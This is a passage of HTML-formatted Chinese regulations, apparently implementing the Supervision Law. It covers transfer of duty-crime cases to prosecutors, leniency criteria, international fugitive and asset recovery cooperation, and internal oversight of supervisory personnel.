复审、复核机关承办部门应当成立工作组，调阅原案卷宗，必要时可以进行调查取证。承办部门应当集体研究，提出办理意见，经审批作出复审、复核决定。决定应当送达申请人，抄送相关单位，并在一定范围内宣布。</p><p>  复审、复核期间，不停止原处理决定的执行。复审、复核机关经审查认定处理决定有错误或者不当的，应当依法撤销、变更原处理决定，或者责令原处理机关及时予以纠正。复审、复核机关经审查认定处理决定事实清楚、适用法律正确的，应当予以维持。</p><p>  坚持复审复核与调查审理分离，原案调查、审理人员不得参与复审复核。</p><p>  <strong>第六节  移送审查起诉</strong></p><p>  第二百四十三条  监察机关决定对涉嫌职务犯罪的被调查人移送起诉的，应当出具《起诉意见书》，连同案卷材料、证据及到案经过材料等，一并移送同级人民检察院。</p><p>  监察机关案件审理部门负责与人民检察院审查起诉的衔接工作，调查、案件监督管理等部门应当予以协助。</p><p>  国家监察委员会派驻或者派出的监察机构、监察专员调查的职务犯罪案件，应当依法移送省级人民检察院审查起诉。</p><p>  第二百四十四条  涉嫌职务犯罪的被调查人和涉案人员符合监察法第三十四条、第三十五条规定情形的，结合其案发前的一贯表现、违法犯罪行为的情节、后果和影响等因素，监察机关经综合研判和集体审议，报请上一级监察机关批准，可以在移送人民检察院时依法提出从轻、减轻或者免除处罚等从宽处罚建议。报请批准时，应当一并提供主要证据材料、忏悔反思材料。</p><p>  上级监察机关相关监督检查部门负责审查工作，重点审核拟认定的从宽处罚情形、提出的从宽处罚建议，经审批在十五个工作日以内作出批复。</p><p>  第二百四十五条  涉嫌职务犯罪的被调查人具有下列情形之一，如实交代自己主要犯罪事实的，可以认定为监察法第三十四条第一项规定的自动投案，真诚悔罪悔过：</p><p>  （一）职务犯罪问题未被监察机关掌握或者监察机关正在就有关问题线索进行适当了解时，向监察机关投案的；</p><p>  （二）在监察机关谈话、函询过程中，如实交代监察机关未掌握的涉嫌职务犯罪问题的；</p><p>  （三）在初步核实阶段，尚未受到监察机关谈话时投案的；</p><p>  （四）职务犯罪问题虽被监察机关立案，但尚未受到讯问或者采取监察强制措施，向监察机关投案的；</p><p>  （五）因伤病等客观原因无法前往投案，先委托他人代为表达投案意愿，或者以书信、网络、电话、传真等方式表达投案意愿，后到监察机关接受处理的；</p><p>  （六）涉嫌职务犯罪潜逃后又投案，包括在被通缉、抓捕过程中投案的；</p><p>  （七）经查实确已准备去投案，或者正在投案途中被有关机关抓获的；</p><p>  （八）经他人规劝或者在他人陪同下投案的；</p><p>  （九）虽未向监察机关投案，但向其所在党组织、单位或者有关负责人员投案，向有关巡视巡察机构投案，以及向公安机关、人民检察院、人民法院投案的；</p><p>  （十）具有其他应当视为自动投案的情形的。</p><p>  被调查人自动投案后不能如实交代自己的主要犯罪事实，或者自动投案并如实供述自己的罪行后又翻供的，不能适用前款规定。</p><p>  第二百四十六条  涉嫌职务犯罪的被调查人具有下列情形之一的，可以认定为监察法第三十四条第二项规定的积极配合调查工作，如实供述监察机关还未掌握的违法犯罪行为：</p><p>  （一）监察机关所掌握线索针对的犯罪事实不成立，在此范围外被调查人主动交代其他罪行的；</p><p>  （二）主动交代监察机关尚未掌握的犯罪事实，与监察机关已掌握的犯罪事实属不同种罪行的；</p><p>  （三）主动交代监察机关尚未掌握的犯罪事实，与监察机关已掌握的犯罪事实属同种罪行的；</p><p>  （四）监察机关掌握的证据不充分，被调查人如实交代有助于收集定案证据的。</p><p>  第二百四十七条  涉嫌职务犯罪的被调查人具有下列情形之一的，可以认定为监察法第三十四条第三项规定的积极退赃，减少损失：</p><p>  （一）全额退赃的；</p><p>  （二）退赃能力不足，但被调查人及其亲友在监察机关追缴赃款赃物过程中积极配合，且大部分已追缴到位的；</p><p>  （三）犯罪后主动采取措施避免损失发生，或者积极采取有效措施减少、挽回大部分损失的。</p><p>  第二百四十八条  涉嫌职务犯罪的被调查人具有下列情形之一的，可以认定为监察法第三十四条第四项规定的具有重大立功表现：</p><p>  （一）检举揭发他人重大犯罪行为且经查证属实的；</p><p>  （二）提供其他重大案件的重要线索且经查证属实的；</p><p>  （三）阻止他人重大犯罪活动的；</p><p>  （四）协助抓捕其他重大职务犯罪案件被调查人、重大犯罪嫌疑人（包括同案犯）的；</p><p>  （五）为国家挽回重大损失等对国家和社会有其他重大贡献的。</p><p>  前款所称重大犯罪一般是指依法可能被判处无期徒刑以上刑罚的犯罪行为；重大案件一般是指在本省、自治区、直辖市或者全国范围内有较大影响的案件；查证属实一般是指有关案件已被监察机关或者司法机关立案调查、侦查，被调查人、犯罪嫌疑人被监察机关采取监察强制措施或者被司法机关采取刑事强制措施，或者被告人被人民法院作出有罪判决，并结合案件事实、证据进行判断。</p><p>  监察法第三十四条第四项规定的案件涉及国家重大利益，是指案件涉及国家主权和领土完整、国家安全、外交、社会稳定、经济发展等情形。</p><p>  第二百四十九条  涉嫌行贿等犯罪的涉案人员具有下列情形之一的，可以认定为监察法第三十五条规定的揭发有关被调查人职务违法犯罪行为，查证属实或者提供重要线索，有助于调查其他案件：</p><p>  （一）揭发所涉案件以外的被调查人职务犯罪行为，经查证属实的；</p><p>  （二）提供的重要线索指向具体的职务犯罪事实，对调查其他案件起到实质性推动作用的；</p><p>  （三）提供的重要线索有助于加快其他案件办理进度，或者对其他案件固定关键证据、挽回损失、追逃追赃等起到积极作用的。</p><p>  第二百五十条  从宽处罚建议一般应当在移送起诉时作为《起诉意见书》内容一并提出，特殊情况下也可以在案件移送后、人民检察院提起公诉前，单独形成从宽处罚建议书移送人民检察院。对于从宽处罚建议所依据的证据材料，应当一并移送人民检察院。</p><p>  监察机关对于被调查人在调查阶段认罪认罚，但不符合监察法规定的提出从宽处罚建议条件，在移送起诉时没有提出从宽处罚建议的，应当在《起诉意见书》中写明其自愿认罪认罚的情况。</p><p>  第二百五十一条  监察机关一般应当在正式移送起诉十日前，向拟移送的人民检察院采取书面通知等方式预告移送事宜。监察机关发现被调查人因身体等原因存在不适宜羁押等可能影响刑事强制措施执行情形的，应当通报人民检察院；被调查人已被采取留置措施的，可以在移送起诉前依法变更为责令候查措施。对于未采取监察强制措施的案件，可以根据案件具体情况，向人民检察院提出对被调查人采取刑事强制措施的建议。</p><p>  第二百五十二条  监察机关办理的职务犯罪案件移送起诉，需要指定起诉、审判管辖的，应当与同级人民检察院协商有关程序事宜。需要由同级人民检察院的上级人民检察院指定管辖的，应当商请同级人民检察院办理指定管辖事宜。</p><p>  监察机关一般应当在移送起诉二十日前，将商请指定管辖函送交同级人民检察院。商请指定管辖函应当附案件基本情况，对于被调查人已被其他机关立案侦查的犯罪认为需要并案审查起诉的，一并进行说明。</p><p>  派驻或者派出的监察机构、监察专员调查的职务犯罪案件需要指定起诉、审判管辖的，应当报派出机关办理指定管辖手续。</p><p>  第二百五十三条  上级监察机关指定下级监察机关进行调查，移送起诉时需要人民检察院依法指定管辖的，应当按规定办理有关程序事宜。</p><p>  第二百五十四条  监察机关对已经移送起诉的职务犯罪案件，发现遗漏被调查人罪行需要补充移送起诉的，应当经审批出具《补充起诉意见书》，连同相关案卷材料、证据等一并移送同级人民检察院。</p><p>  对于经人民检察院指定管辖的案件需要补充移送起诉的，可以直接移送原受理移送起诉的人民检察院；需要追加犯罪嫌疑人、被告人的，应当再次商请人民检察院办理指定管辖手续。</p><p>  第二百五十五条  对于涉嫌行贿犯罪、介绍贿赂犯罪或者共同职务犯罪等关联案件的涉案人员，移送起诉时一般应当随主案确定管辖。</p><p>  主案与关联案件由不同监察机关立案调查的，调查关联案件的监察机关在移送起诉前，应当报告或者通报调查主案的监察机关，由其统一协调案件管辖事宜。因特殊原因，关联案件不宜随主案确定管辖的，调查主案的监察机关应当及时通报和协调有关事项。</p><p>  第二百五十六条  监察机关对于人民检察院在审查起诉中书面提出的下列要求应当予以配合：</p><p>  （一）认为可能存在以非法方法收集证据情形，要求监察机关对证据收集的合法性作出说明或者提供相关证明材料的；</p><p>  （二）排除非法证据后，要求监察机关另行指派调查人员重新取证的；</p><p>  （三）对物证、书证、视听资料、电子数据及勘验检查、辨认、调查实验等笔录存在疑问，要求调查人员提供获取、制作的有关情况的；</p><p>  （四）要求监察机关对案件中某些专门性问题进行鉴定，或者对勘验检查进行复验、复查的；</p><p>  （五）认为主要犯罪事实已经查清，仍有部分证据需要补充完善，要求监察机关补充提供证据的；</p><p>  （六）人民检察院依法提出的其他工作要求。</p><p>  第二百五十七条  监察机关对于人民检察院依法退回补充调查的案件，应当向主要负责人报告，并积极开展补充调查工作。</p><p>  第二百五十八条  对人民检察院退回补充调查的案件，经审批分别作出下列处理：</p><p>  （一）认定犯罪事实的证据不够充分的，应当在补充证据后，制作补充调查报告书，连同相关材料一并移送人民检察院审查，对无法补充完善的证据，应当作出书面情况说明并加盖监察机关或者承办部门公章；</p><p>  （二）在补充调查中发现新的同案犯或者增加、变更犯罪事实，需要追究刑事责任的，应当重新提出处理意见，移送人民检察院审查；</p><p>  （三）犯罪事实的认定出现重大变化，认为不应当追究被调查人刑事责任的，应当在补充调查期限内重新提出处理意见，将处理结果书面通知人民检察院并说明理由；</p><p>  （四）认为移送起诉的犯罪事实清楚，证据确实、充分的，应当说明理由，移送人民检察院依法审查。</p><p>  第二百五十九条  人民检察院在审查起诉过程中发现新的职务违法或者职务犯罪问题线索并移送监察机关的，监察机关应当依法处置。</p><p>  第二百六十条  在案件审判过程中，人民检察院书面要求监察机关补充提供证据，对证据进行补正、解释，或者协助人民检察院补充侦查的，监察机关应当予以配合。监察机关不能提供有关证据材料的，应当书面说明情况。</p><p>  人民法院在审判过程中就证据收集合法性问题要求有关调查人员出庭说明情况时，监察机关应当依法予以配合。</p><p>  第二百六十一条  监察机关认为人民检察院不起诉决定有错误的，应当在收到不起诉决定书后三十日以内，依法向其上一级人民检察院提请复议。监察机关应当将上述情况及时向上一级监察机关书面报告。</p><p>  第二百六十二条  对于监察机关移送起诉的案件，人民检察院作出不起诉决定，人民法院作出无罪判决，或者监察机关经人民检察院退回补充调查后不再移送起诉，涉及对被调查人已生效政务处分事实认定的，监察机关应当依法对政务处分决定进行审核。认为原政务处分决定认定事实清楚、适用法律正确的，不再改变；认为原政务处分决定确有错误或者不当的，依法予以撤销或者变更。</p><p>  第二百六十三条  对于贪污贿赂、失职渎职等职务犯罪案件，被调查人逃匿，在通缉一年后不能到案，或者被调查人死亡，依法应当追缴其违法所得及其他涉案财产的，承办部门在调查终结后应当依法移送审理。</p><p>  监察机关应当经集体审议，出具《没收违法所得意见书》，连同案卷材料、证据等，一并移送人民检察院依法提出没收违法所得的申请。</p><p>  监察机关将《没收违法所得意见书》移送人民检察院后，在逃的被调查人自动投案或者被抓获的，监察机关应当及时通知人民检察院。</p><p>  第二百六十四条  监察机关立案调查拟适用缺席审判程序的贪污贿赂犯罪案件，应当逐级报送国家监察委员会同意。</p><p>  监察机关承办部门认为在境外的被调查人犯罪事实已经查清，证据确实、充分，依法应当追究刑事责任的，应当依法移送审理。</p><p>  监察机关应当经集体审议，出具《起诉意见书》，连同案卷材料、证据等，一并移送人民检察院审查起诉。</p><p>  在审查起诉或者缺席审判过程中，犯罪嫌疑人、被告人向监察机关自动投案或者被抓获的，监察机关应当立即通知人民检察院、人民法院。</p><h2 id="第六章-反腐败国际合作"><a href="#第六章-反腐败国际合作" class="headerlink" title="第六章  反腐败国际合作"></a>第六章  反腐败国际合作</h2><p>  <strong>第一节  工作职责和领导体制</strong></p><p>  第二百六十五条  国家监察委员会统筹协调与其他国家、地区、国际组织开展反腐败国际交流、合作。</p><p>  国家监察委员会组织《联合国反腐败公约》等反腐败国际条约的实施以及履约审议等工作，承担《联合国反腐败公约》司法协助中央机关有关工作。</p><p>  国家监察委员会组织协调有关单位建立集中统一、高效顺畅的反腐败国际追逃追赃和防逃协调机制，统筹协调、督促指导各级监察机关反腐败国际追逃追赃等涉外案件办理工作，具体履行下列职责：</p><p>  （一）制定反腐败国际追逃追赃和防逃工作计划，研究工作中的重要问题；</p><p>  （二）会同有关单位开展反腐败国际追逃追赃等重大涉外案件办理工作；</p><p>  （三）办理由国家监察委员会管辖的涉外案件；</p><p>  （四）指导地方各级监察机关依法开展涉外案件办理工作；</p><p>  （五）汇总和通报全国职务犯罪外逃案件信息和追逃追赃工作信息；</p><p>  （六）建立健全反腐败国际追逃追赃和防逃合作网络；</p><p>  （七）承担监察机关开展国际刑事司法协助的主管机关职责；</p><p>  （八）承担其他与反腐败国际追逃追赃等涉外案件办理工作相关的职责。</p><p>  第二百六十六条  地方各级监察机关在国家监察委员会领导下，统筹协调、督促指导本地区反腐败国际追逃追赃等涉外案件办理工作，具体履行下列职责：</p><p>  （一）落实上级监察机关关于反腐败国际追逃追赃和防逃工作部署，制定工作计划；</p><p>  （二）按照管辖权限或者上级监察机关指定管辖，办理涉外案件；</p><p>  （三）按照上级监察机关要求，协助配合其他监察机关开展涉外案件办理工作；</p><p>  （四）汇总和通报本地区职务犯罪外逃案件信息和追逃追赃工作信息；</p><p>  （五）承担本地区其他与反腐败国际追逃追赃等涉外案件办理工作相关的职责。</p><p>  省级监察委员会应当会同有关单位，建立健全本地区反腐败国际追逃追赃和防逃协调机制。</p><p>  国家监察委员会派驻或者派出的监察机构、监察专员统筹协调、督促指导驻在单位反腐败国际追逃追赃等涉外案件办理工作，参照第一款规定执行。</p><p>  第二百六十七条  国家监察委员会国际合作局归口管理监察机关反腐败国际追逃追赃等涉外案件办理工作。地方各级监察委员会应当明确专责部门，归口管理本地区涉外案件办理工作。</p><p>  国家监察委员会派驻或者派出的监察机构、监察专员和地方各级监察机关办理涉外案件中有关执法司法国际合作事项，应当逐级报送国家监察委员会审批。由国家监察委员会依法直接或者协调有关单位与有关国家（地区）相关机构沟通，以双方认可的方式实施。</p><p>  第二百六十八条  监察机关应当建立追逃追赃和防逃工作内部联络机制。承办部门在调查过程中，发现被调查人或者重要涉案人员外逃、违法所得及其他涉案财产被转移到境外的，可以请追逃追赃部门提供工作协助。监察机关将案件移送人民检察院审查起诉后，仍有重要涉案人员外逃或者未追缴的违法所得及其他涉案财产的，应当由追逃追赃部门继续办理，或者由追逃追赃部门指定协调有关单位办理。</p><p>  <strong>第二节  国（境）内工作</strong></p><p>  第二百六十九条  监察机关应当将防逃工作纳入日常监督内容，督促相关机关、单位建立健全防逃责任机制。</p><p>  监察机关在监督、调查工作中，应当根据情况制定对监察对象、重要涉案人员的防逃方案，防范人员外逃和资金外流风险。监察机关应当会同同级组织人事、外事、公安、移民管理等单位健全防逃预警机制，对存在外逃风险的监察对象早发现、早报告、早处置。</p><p>  第二百七十条  监察机关应当加强与同级人民银行、公安等单位的沟通协作，推动预防、打击利用离岸公司和地下钱庄等向境外转移违法所得及其他涉案财产，对涉及职务违法和职务犯罪的行为依法进行调查。</p><p>  第二百七十一条  国家监察委员会派驻或者派出的监察机构、监察专员和地方各级监察委员会发现监察对象出逃、失踪、出走，或者违法所得及其他涉案财产被转移至境外的，应当在二十四小时以内将有关信息逐级报送至国家监察委员会国际合作局，并迅速开展相关工作。</p><p>  第二百七十二条  监察机关追逃追赃部门统一接收巡视巡察机构、审计机关、执法机关、司法机关等单位移交的外逃信息。</p><p>  监察机关对涉嫌职务违法和职务犯罪的外逃人员，应当明确承办部门，建立案件档案。</p><p>  第二百七十三条  监察机关应当依法全面收集外逃人员涉嫌职务违法和职务犯罪证据。</p><p>  第二百七十四条  开展反腐败国际追逃追赃等涉外案件办理工作，应当把思想教育贯穿始终，落实宽严相济刑事政策，依法适用认罪认罚从宽制度，促使外逃人员回国投案或者配合调查、主动退赃。开展相关工作，应当尊重所在国家（地区）的法律规定。</p><p>  第二百七十五条 外逃人员归案、违法所得及其他涉案财产被追缴后，承办案件的监察机关应当将情况逐级报送国家监察委员会国际合作局。监察机关应当依法对涉案人员和违法所得及其他涉案财产作出处置，或者请有关单位依法处置。对不需要继续采取相关措施的，应当及时解除或者撤销。</p><p>  <strong>第三节  对外合作</strong></p><p>  第二百七十六条  监察机关对依法应当留置或者已经决定留置的外逃人员，需要申请发布国际刑警组织红色通报的，应当逐级报送国家监察委员会审核。国家监察委员会审核后，依法通过公安部向国际刑警组织提出申请。</p><p>  需要延期、暂停、撤销红色通报的，申请发布红色通报的监察机关应当逐级报送国家监察委员会审核，由国家监察委员会依法通过公安部联系国际刑警组织办理。</p><p>  第二百七十七条  地方各级监察机关通过引渡方式办理相关涉外案件的，应当按照《中华人民共和国引渡法》、相关双边及多边国际条约等规定准备引渡请求书及相关材料，逐级报送国家监察委员会审核。由国家监察委员会依法通过外交途径向外国提出引渡请求。</p><p>  第二百七十八条  地方各级监察机关通过刑事司法协助方式办理相关涉外案件的，应当按照《中华人民共和国国际刑事司法协助法》（以下简称国际刑事司法协助法）、相关双边及多边国际条约等规定准备刑事司法协助请求书及相关材料，逐级报送国家监察委员会审核。由国家监察委员会依法直接或者通过对外联系机关等渠道，向外国提出刑事司法协助请求。</p><p>  国家监察委员会收到外国提出的刑事司法协助请求书及所附材料，经审查认为符合有关规定的，作出决定并交由省级监察机关执行，或者转交其他有关主管机关。省级监察机关应当立即执行，或者交由下级监察机关执行，并将执行结果或者妨碍执行的情形及时报送国家监察委员会。在执行过程中，需要依法采取查询、调取、查封、扣押、冻结等措施或者需要返还涉案财物的，根据我国法律规定和国家监察委员会的执行决定办理有关法律手续。</p><p>  第二百七十九条  地方各级监察机关通过执法合作方式办理相关涉外案件的，应当将合作事项及相关材料逐级报送国家监察委员会审核。由国家监察委员会依法直接或者协调有关单位，向有关国家（地区）相关机构提交并开展合作。</p><p>  第二百八十条  地方各级监察机关通过境外追诉方式办理相关涉外案件的，应当提供外逃人员相关违法线索和证据，逐级报送国家监察委员会审核。由国家监察委员会按照国际刑事司法协助法等规定直接或者协调有关单位向有关国家（地区）相关机构提交，请其依法对外逃人员调查、起诉、审判，移管被判刑人或者遣返外逃人员。</p><p>  第二百八十一条  监察机关对依法应当追缴的境外违法所得及其他涉案财产，应当责令涉案人员以合法方式退赔。涉案人员拒不退赔的，可以依法通过下列方式追缴：</p><p>  （一）在开展引渡等追逃合作时，随附请求有关国家（地区）移交相关违法所得及其他涉案财产；</p><p>  （二）依法启动违法所得没收程序，申请由人民法院对相关违法所得及其他涉案财产作出没收裁定，请有关国家（地区）承认和执行，并予以返还；</p><p>  （三）请有关国家（地区）依法追缴相关违法所得及其他涉案财产，并予以返还；</p><p>  （四）通过其他合法方式追缴。</p><h2 id="第七章-对监察机关和监察人员的监督"><a href="#第七章-对监察机关和监察人员的监督" class="headerlink" title="第七章  对监察机关和监察人员的监督"></a>第七章  对监察机关和监察人员的监督</h2><p>  第二百八十二条  监察机关和监察人员必须自觉坚持党的领导，在党组织的管理、监督下开展工作，依法接受本级人民代表大会及其常务委员会的监督，接受民主监督、司法监督、社会监督、舆论监督，加强内部监督制约机制建设，确保权力受到严格的约束和监督。</p><p>  第二百八十三条  各级监察委员会应当按照监察法第六十条第二款规定，由主要负责人在本级人民代表大会常务委员会全体会议上报告专项工作。</p><p>  在报告专项工作前，应当与本级人民代表大会有关专门委员会、常务委员会有关工作机构沟通协商，并配合开展专题调查研究等工作。各级人民代表大会常务委员会审议专项工作报告时，本级监察委员会应当根据要求派出负责人列席相关会议，听取意见。</p><p>  各级监察委员会应当认真研究处理本级人民代表大会常务委员会反馈的审议意见，并按照要求书面报告研究处理情况。本级人民代表大会常务委员会对专项工作报告作出决议的，监察委员会应当在决议规定的期限内，将执行决议的情况向其报告。</p><p>  第二百八十四条  各级监察委员会应当积极接受、配合本级人民代表大会常务委员会组织的执法检查。对本级人民代表大会常务委员会的执法检查报告，应当认真研究处理，并向其报告研究处理情况。本级人民代表大会常务委员会对执法检查报告作出决议的，监察委员会应当在决议规定的期限内，将执行决议的情况向其报告。</p><p>  第二百八十五条  各级监察委员会在本级人民代表大会常务委员会会议审议与监察工作有关的议案和报告时，应当派相关负责人到会听取意见，回答询问。</p><p>  本级人民代表大会常务委员会就与监察工作有关的重大问题，召开全体会议、联组会议或者分组会议进行专题询问的，监察委员会负责人应当到会，听取意见，回答询问。各级监察委员会应当及时向本级人民代表大会常务委员会提交专题询问中提出意见的研究处理情况报告。</p><p>  监察机关对依法交由监察机关答复的质询案应当按照要求进行答复。口头答复的，由监察机关主要负责人或者委派相关负责人到会答复。书面答复的，由监察机关主要负责人签署。</p><p>  第二百八十六条  各级监察机关应当通过互联网政务媒体、报刊、广播、电视等途径，向社会及时准确公开下列监察工作信息：</p><p>  （一）监察法规；</p><p>  （二）依法应当向社会公开的案件调查信息；</p><p>  （三）检举控告地址、电话、网站等信息；</p><p>  （四）其他依法应当公开的信息。</p><p>  第二百八十七条  各级监察机关可以根据工作需要，按程序选聘特约监察员履行监督、咨询等职责。特约监察员名单应当向社会公布。</p><p>  监察机关应当为特约监察员依法开展工作提供必要条件和便利。特约监察员对监察机关提出的意见、建议和批评，监察机关应当及时办理和反馈。</p><p>  第二百八十八条  监察机关实行严格的人员准入制度，严把政治关、品行关、能力关、作风关、廉洁关。监察人员必须忠诚坚定、担当尽责、遵纪守法、清正廉洁。</p><p>  第二百八十九条  监察机关应当建立信访举报、监督检查、调查、案件监督管理、案件审理等部门相互协调制约的工作机制。</p><p>  监督检查和调查部门实行分工协作、相互制约。监督检查部门主要负责联系地区、部门、单位的日常监督检查和对涉嫌一般违法问题线索处置。调查部门主要负责对涉嫌严重职务违法和职务犯罪问题线索进行初步核实和立案调查。</p><p>  案件监督管理部门负责对监督检查、调查工作全过程进行监督管理，做好线索管理、组织协调、监督检查、督促办理、统计分析等工作。案件监督管理部门发现监察人员在监督检查、调查中有违规办案行为的，及时督促整改；涉嫌违纪违法的，根据管理权限移交相关部门处理。</p><p>  第二百九十条  监察机关应当部署使用覆盖信访举报、线索处置、监督检查、调查、案件审理等监察执法主要流程和关键要素的监察一体化工作平台，推动数字技术融入监察工作，通过信息化手段加强对监督、调查、处置工作的全过程监督管理。</p><p>  第二百九十一条  监察机关应当对监察权运行关键环节进行经常性监督检查，适时开展专项督查。案件监督管理、案件审理等部门应当按照各自职责，对问题线索处置、调查措施使用、涉案财物管理等进行监督检查，建立常态化、全覆盖的案件质量评查机制。</p><p>  第二百九十二条  监察机关应当加强对监察人员执行职务和遵纪守法情况的监督，按照管理权限依法对监察人员涉嫌违法犯罪问题进行调查处置。</p><p>  第二百九十三条  监察机关及其监督检查、调查部门负责人应当定期检查调查期间的录音录像、谈话笔录、讯问笔录、询问笔录、涉案财物登记资料，加强对调查全过程的监督，发现问题及时纠正并报告。</p><p>  对谈话、讯问和询问的同步录音录像，应当重点检查是否存在以下情形：</p><p>  （一）以暴力、威胁等非法方法收集证据；</p><p>  （二）未保证被调查人的饮食和必要的休息时间；</p><p>  （三）谈话笔录、讯问笔录、询问笔录记载的起止时间与谈话、讯问、询问录音录像资料反映的起止时间不一致；</p><p>  （四）谈话笔录、讯问笔录、询问笔录与谈话、讯问、询问录音录像资料内容存在实质性差异。</p><p>  第二百九十四条  对监察人员打听案情、过问案件、说情干预的，办理监察事项的监察人员应当及时向上级负责人报告。有关情况应当登记备案。</p><p>  发现办理监察事项的监察人员未经批准接触被调查人、涉案人员及其特定关系人，或者存在交往情形的，知情的监察人员应当及时向上级负责人报告。有关情况应当登记备案。</p><p>  第二百九十五条  办理监察事项的监察人员有监察法第六十七条所列情形之一的，应当自行提出回避；没有自行提出回避的，监察机关应当依法决定其回避，监察对象、检举人及其他有关人员也有权要求其回避。</p><p>  选用借调人员、看护人员、调查场所，应当严格执行回避制度。</p><p>  第二百九十六条  监察人员自行提出回避，或者监察对象、检举人及其他有关人员要求监察人员回避的，应当书面或者口头提出，并说明理由。口头提出的，应当形成记录。</p><p>  监察机关主要负责人的回避，由上级监察机关主要负责人决定；其他监察人员的回避，由本级监察机关主要负责人决定。</p><p>  第二百九十七条  上级监察机关应当通过专项检查、业务考评、开展复查等方式，强化对下级监察机关及监察人员执行职务和遵纪守法情况的监督。</p><p>  第二百九十八条  监察机关应当对监察人员有计划地进行政治、理论和业务培训。培训应当坚持理论联系实际、按需施教、讲求实效，突出政治机关特色，建设忠诚干净担当、敢于善于斗争的高素质专业化监察队伍，全面提高监察工作规范化法治化正规化水平。</p><p>  第二百九十九条  监察机关应当严格执行保密制度，控制监察事项知悉范围和时间。监察人员不准私自留存、隐匿、查阅、摘抄、复制、携带问题线索和涉案资料，严禁泄露监察工作秘密。</p><p>  监察机关应当建立健全检举控告保密制度，对检举控告人的姓名（单位名称）、工作单位、住址、电话和邮箱等有关情况以及检举控告内容必须严格保密。</p><p>  第三百条  监察机关涉密人员离岗离职后，应当遵守脱密期管理规定，严格履行保密义务，不得泄露相关秘密。</p><p>  第三百零一条  监察人员离任三年以内，不得从事与监察和司法工作相关联且可能发生利益冲突的职业。</p><p>  监察人员离任后，不得担任原任职监察机关办理案件的诉讼代理人或者辩护人，但是作为当事人的监护人或者近亲属代理诉讼或者进行辩护的除外。</p><p>  第三百零二条  监察人员应当严格遵守有关规范领导干部配偶、子女及其配偶经商办企业行为的规定。</p><p>  第三百零三条  监察机关及其工作人员在履行职责过程中应当依法保护企业产权和自主经营权，严禁利用职权非法干扰企业生产经营。需要企业经营者协助调查的，应当依法保障其人身权利、财产权利和其他合法权益，避免或者尽量减少对涉案企业正常生产经营活动的影响。</p><p>  监察机关查封、扣押、冻结以及追缴涉案财物，应当严格区分企业财产与经营者个人财产，被调查人个人财产与家庭成员财产，违法所得、其他涉案财产与合法财产。</p><p>  查封经营性涉案财物，企业继续使用对该涉案财物价值无重大影响的，可以允许其使用。对于按规定不应交由企业保管使用的涉案财物，监察机关应当采取合理的保管保值措施。对于正在运营或者正在用于科技创新、产品研发的设备和技术资料等，一般不予查封、扣押，确需调取违法犯罪证据的，可以采取拍照、复制等方式。</p><p>  第三百零四条  监察机关根据已经掌握的事实及证据，发现涉嫌严重职务违法或者职务犯罪的监察人员可能实施下列行为之一的，经依法审批，可以在具备安全保障条件的场所对其采取禁闭措施：</p><p>  （一）继续实施违法犯罪行为的；</p><p>  （二）为被调查人或者涉案人员通风报信等泄露监察工作秘密的；</p><p>  （三）威胁、恐吓、蓄意报复举报人、控告人、被害人、证人、鉴定人等相关人员的；</p><p>  （四）其他可能造成更为严重的后果或者恶劣影响的行为。 </p><p>  第三百零五条  采取禁闭措施时，调查人员不得少于二人，应当向被禁闭人员宣布《禁闭决定书》，告知被禁闭人员权利义务，要求其在《禁闭决定书》上签名、捺指印。被禁闭人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  禁闭的期限不得超过七日，自向被禁闭人员宣布之日起算。</p><p>  第三百零六条  采取禁闭措施后，应当在二十四小时以内通知被禁闭人员所在单位和家属。当面通知的，由有关人员在《禁闭通知书》上签名。无法当面通知的，可以先以电话等方式通知，并通过邮寄、转交等方式送达《禁闭通知书》，要求有关人员在《禁闭通知书》上签名。有关人员拒绝签名的，调查人员应当在文书上记明。</p><p>  因可能伪造、隐匿、毁灭证据，干扰证人作证或者串供等有碍调查情形而不宜通知的，应当按规定报批，记录在案。有碍调查的情形消失后，应当立即通知被禁闭人员所在单位和家属。</p><p>  第三百零七条  对被禁闭人员不需要继续采取禁闭措施的，应当按规定报批后解除禁闭或者变更为责令候查措施。禁闭期满的，应当按规定报批后予以解除。</p><p>  解除禁闭措施的，调查人员应当向被禁闭人员宣布解除禁闭措施的决定，由其在《解除禁闭决定书》上签名、捺指印；变更为责令候查措施的，应当向被禁闭人员宣布变更为责令候查措施的决定，由其在《变更禁闭决定书》上签名、捺指印。被禁闭人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  解除禁闭措施或者变更为责令候查措施的，应当及时通知被禁闭人员所在单位和家属、申请人。调查人员应当与交接人办理交接手续，并由其在《解除禁闭通知书》或者《变更禁闭通知书》上签名。无法通知或者有关人员拒绝签名的，调查人员应当在文书上记明。不得因办理交接手续延迟解除或者变更禁闭措施。</p><p>  在禁闭期满前，对被禁闭人员采取管护、留置措施的，按照本条例关于采取管护、留置措施的规定执行。</p><p>  第三百零八条  被调查人及其近亲属、利害关系人认为监察机关及其工作人员存在监察法第六十九条第一款规定的有关情形，向监察机关提出申诉的，由监察机关案件监督管理部门依法受理。监察机关应当自受理申诉之日起一个月以内作出处理决定。</p><p>  前款规定的利害关系人，是指与有关涉案财产存在利害关系的自然人、法人或者其他组织。</p><p>  第三百零九条  监察机关案件监督管理部门受理申诉后，应当组织成立核查组，对申诉反映的问题进行核实。根据工作需要，核查组可以调阅相关措施文书等材料，听取申诉人意见和承办部门工作人员的情况说明。案件监督管理部门应当集体研究，提出办理意见，经审批作出决定。</p><p>  第三百一十条  监察机关应当自申诉处理决定作出之日起七日以内，向申诉人送达申诉处理决定书，要求其在申诉处理决定书上签名。申诉人拒绝签名的，工作人员应当在文书上记明。</p><p>  第三百一十一条  申诉人对申诉处理决定不服的，可以自收到申诉处理决定书之日起一个月以内向上一级监察机关申请复查。上一级监察机关应当进行核实，并自收到复查申请之日起二个月以内作出处理决定。</p><p>  第三百一十二条  监察机关应当加强留置场所管理和监督工作，依法规范管理、使用留置场所。</p><p>  留置场所应当建立健全保密、消防、医疗、防疫、餐饮及安保等方面安全制度，制定突发事件处置预案，采取安全防范措施，严格落实安全工作责任制。</p><p>  发生被强制到案人员、被管护人员、被留置人员或者被禁闭人员死亡、伤残、脱逃等办案安全事故、事件的，应当及时做好处置、处理工作。相关情况应当立即报告监察机关主要负责人，并在二十四小时以内逐级上报至国家监察委员会。</p><p>  第三百一十三条  监察机关在维护监督执法调查工作纪律方面失职失责的，依法追究责任。监察人员涉嫌严重职务违法、职务犯罪或者对案件处置出现重大失误的，既应当追究直接责任，还应当严肃追究负有责任的领导人员责任。</p><p>  监察机关应当建立办案质量责任制，对滥用职权、失职失责造成严重后果的，实行终身责任追究。</p><h2 id="第八章-法律责任"><a 